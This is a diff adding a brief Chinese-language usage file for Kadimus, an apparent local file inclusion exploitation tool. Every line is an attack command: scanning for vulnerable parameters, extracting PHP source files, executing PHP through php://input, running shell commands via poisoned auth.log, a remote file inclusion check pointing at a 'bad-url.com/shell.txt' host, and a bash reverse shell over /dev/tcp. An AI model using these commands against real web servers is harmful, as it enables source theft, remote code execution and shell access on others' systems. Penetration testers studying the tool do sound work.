@@ -1,0 +1,14 @@
+测试示例
+扫描:
+./kadimus -u localhost/?pg=contact -A my_user_agent
+./kadimus -U url_list.txt --threads 10 --connect-timeout 10 --retry-times 0
+获取文件源码:
+./kadimus -t localhost/?pg=contact -G -f "index.php" -O local_output.php --inject-at pg
+执行php代码:
+./kadimus -t localhost/?pg=php://input -C '' -X input
+命令执行:
+./kadimus -t localhost/?pg=/var/log/auth.log -X auth -c 'ls -lah' --ssh-target localhost
+检查远程文件包含(RFI)漏洞:
+/* http://bad-url.com/shell.txt */ 
+反弹shell:
+./kadimus -t localhost/?pg=contact.php -Xdata --inject-at pg -r -l 12345 -c 'bash -i >& /dev/tcp/127.0.0.1/12345 0>&1' --retry-times 0
